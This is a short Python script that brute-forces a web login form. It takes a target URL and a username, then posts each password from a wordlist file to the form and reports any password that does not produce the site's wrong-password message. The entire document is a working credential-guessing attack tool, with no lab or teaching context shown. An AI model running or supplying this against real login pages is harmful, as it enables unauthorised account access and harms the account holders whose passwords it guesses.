import pip._vendor.requests as requests
import sys

from validate_url import *

url = validate_url(sys.argv[1])

username = input("What is the username you wish to attempt? ")
error = input("Enter Wrong Password Error Message: ")

file = open("passwords.txt", "r")

for password in file.readlines():
    password = password.strip("\n")
    data = {'username':username, 'password':password, 'login':"submit"}
    send_data = requests.post(url, data=data)
    if send_data.ok:
        if error in str(send_data.content):
            print("password: " + password+" failed")
        else:
            print("Password found: " +password)
